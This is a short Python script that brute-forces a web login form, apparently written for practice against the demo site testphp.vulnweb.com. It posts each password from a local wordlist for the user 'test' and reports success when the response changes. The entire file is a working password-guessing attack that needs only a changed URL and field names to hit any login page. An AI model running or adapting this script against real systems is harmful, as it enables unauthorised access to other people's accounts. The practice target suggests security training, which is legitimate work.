import requests
from bs4 import BeautifulSoup

target_url = "http://testphp.vulnweb.com/userinfo.php"
data = {"uname": "test", "pass": "", "login": "submit"}


with open("/home/kali/password.list", 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data ["pass"] = word
        response = requests.post(target_url, data = data)
        soup = BeautifulSoup(response.content, 'html.parser')
        if b'Signup disabled' not in response.content:
            print("[+] got the password -->" + word)
            exit()
print("[+] Reached end of line")